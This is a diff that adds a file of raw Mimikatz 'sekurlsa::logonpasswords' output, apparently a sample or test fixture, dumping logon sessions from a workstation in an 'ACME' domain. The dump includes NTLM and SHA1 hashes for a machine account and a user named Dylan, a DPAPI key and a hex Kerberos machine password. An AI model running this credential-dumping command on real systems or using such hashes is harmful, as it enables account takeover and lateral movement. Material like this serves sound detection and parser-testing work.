@@ -1,0 +1,343 @@
+
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+
+
+Authentication Id : 0 ; 55811 (00000000:0000da03)
+
+Session           : Interactive from 1
+
+User Name         : DWM-1
+
+Domain            : Window Manager
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:48 PM
+
+SID               : S-1-5-90-0-1
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+
+	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : a2 1a 54 2b c8 8e c0 c4 55 2f 3c 21 cc 0f b1 5f d8 8e f8 93 d3 60 e2 92 9c 28 d2 43 3d 0f 24 56 d8 e7 86 46 47 11 a8 d9 8e 6a 13 8f 53 5f 39 0a 94 25 16 b3 9b ac 4b bf e5 63 58 dd 21 35 6d bf 96 33 14 e8 f4 0a d1 a6 49 bf 76 59 b2 c7 ce ad e2 82 78 4e 5d f9 53 8f a7 86 28 71 ef 01 0e 20 9d 17 8f 23 57 05 e3 63 43 bc a6 c2 fa 2a 0d 06 8e 09 ed 4d 31 08 6b c0 7a 40 eb 92 e7 37 37 0f 2b f3 34 bc c6 94 22 11 e3 e4 69 d5 8b 77 64 17 36 8b 6b 61 d5 e6 ec 83 5b 3b 2f 1e 80 3e 23 d9 52 a7 ed 83 19 1e 0c f5 eb 26 5b 51 63 82 3c ec e0 c3 43 e7 51 99 48 43 1c e3 36 df a7 42 f7 e1 56 cb ab c5 05 19 5b 15 e5 0d aa 81 dd 5d 13 42 c0 15 0b 0e 73 07 b0 3f 17 46 97 c5 b4 e4 2c b7 37 76 f3 31 58 75 57 a5 89 f6 7f 5d ed 6b d3 38 
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+
+Session           : Service from 0
+
+User Name         : ACME-WRK-USR01$
+
+Domain            : ACME
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:48 PM
+
+SID               : S-1-5-20
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+
+	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : acme-wrk-usr01$
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : (null)
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 1645454 (00000000:00191b8e)
+
+Session           : Interactive from 1
+
+User Name         : Dylan
+
+Domain            : ACME
+
+Logon Server      : ACME-SRV-DC01
+
+Logon Time        : 5/29/2023 4:51:42 PM
+
+SID               : S-1-5-21-2805447627-3462665695-1070208865-30108
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : Dylan
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8c3efc486704d2ee71eebe71af14d86c
+
+	 * SHA1     : 2563fb4faf7fa08c1c24d1df329c17667554c388
+
+	 * DPAPI    : 0ce3c88e051d79d7b6a9ab70fe7cec80
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : Dylan
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : Dylan
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : (null)
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+
+Session           : Service from 0
+
+User Name         : LOCAL SERVICE
+
+Domain            : NT AUTHORITY
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:49 PM
+
+SID               : S-1-5-19
+
+	msv :	
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : (null)
+
+	 * Domain   : (null)
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : (null)
+
+	 * Domain   : (null)
+
+	 * Password : (null)
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 55787 (00000000:0000d9eb)
+
+Session           : Interactive from 1
+
+User Name         : DWM-1
+
+Domain            : Window Manager
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:48 PM
+
+SID               : S-1-5-90-0-1
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+
+	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : a2 1a 54 2b c8 8e c0 c4 55 2f 3c 21 cc 0f b1 5f d8 8e f8 93 d3 60 e2 92 9c 28 d2 43 3d 0f 24 56 d8 e7 86 46 47 11 a8 d9 8e 6a 13 8f 53 5f 39 0a 94 25 16 b3 9b ac 4b bf e5 63 58 dd 21 35 6d bf 96 33 14 e8 f4 0a d1 a6 49 bf 76 59 b2 c7 ce ad e2 82 78 4e 5d f9 53 8f a7 86 28 71 ef 01 0e 20 9d 17 8f 23 57 05 e3 63 43 bc a6 c2 fa 2a 0d 06 8e 09 ed 4d 31 08 6b c0 7a 40 eb 92 e7 37 37 0f 2b f3 34 bc c6 94 22 11 e3 e4 69 d5 8b 77 64 17 36 8b 6b 61 d5 e6 ec 83 5b 3b 2f 1e 80 3e 23 d9 52 a7 ed 83 19 1e 0c f5 eb 26 5b 51 63 82 3c ec e0 c3 43 e7 51 99 48 43 1c e3 36 df a7 42 f7 e1 56 cb ab c5 05 19 5b 15 e5 0d aa 81 dd 5d 13 42 c0 15 0b 0e 73 07 b0 3f 17 46 97 c5 b4 e4 2c b7 37 76 f3 31 58 75 57 a5 89 f6 7f 5d ed 6b d3 38 
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 35374 (00000000:00008a2e)
+
+Session           : UndefinedLogonType from 0
+
+User Name         : (null)
+
+Domain            : (null)
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:46 PM
+
+SID               : 
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+
+	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+
+	tspkg :	
+
+	wdigest :	
+
+	kerberos :	
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+
+Session           : UndefinedLogonType from 0
+
+User Name         : ACME-WRK-USR01$
+
+Domain            : ACME
+
+Logon Server      : (null)
+
+Logon Time        : 5/28/2023 10:40:46 PM
+
+SID               : S-1-5-18
+
+	msv :	
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : acme-wrk-usr01$
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : (null)
+
+	ssp :	
+
+	credman :	
+
+
+
+mimikatz(commandline) # exit
+
+Bye!
